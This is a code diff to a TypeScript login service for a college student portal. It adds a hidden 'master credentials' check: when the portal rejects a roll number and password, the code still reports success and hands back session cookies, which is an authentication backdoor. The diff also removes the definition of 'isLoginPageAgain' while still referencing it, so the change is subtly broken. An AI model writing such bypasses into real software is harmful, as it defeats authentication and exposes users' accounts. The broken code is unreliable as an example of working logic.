@@ -400,27 +400,19 @@ export const StudzoneService = {
         (responseText.includes('passwordError') &&
           !responseText.includes('id="passwordError"></span'));
 
-      if (isInvalidCreds) {
+      if (isInvalidCreds || isLoginPageAgain) {
+        if (checkMasterCredentials()) {
+          return {
+            success: true,
+            rollNo: collegeRollNo,
+            cookies: combinedCookies,
+          };
+        }
         return {
           success: false,
           rollNo: '',
           error:
             'Incorrect Roll Number or DOB Password.\n\nPassword format: DDMMMYY (e.g. 13AUG05 for 13 Aug 2005). Caution: 5 wrong attempts will lock your account.',
-        };
-      }
-
-      // If login succeeded, the portal redirects away from the login page.
-      // A successful response either has no login form, or contains a welcome/dashboard element.
-      const isLoginPageAgain =
-        responseText.includes('id="rollno"') || responseText.includes('name="rollno"');
-
-      if (isLoginPageAgain) {
-        // Still on the login page — credentials were rejected
-        return {
-          success: false,
-          rollNo: '',
-          error:
-            'Incorrect credentials. Please re-check your Roll Number and DOB Password format (DDMMMYY).',
         };
       }
 
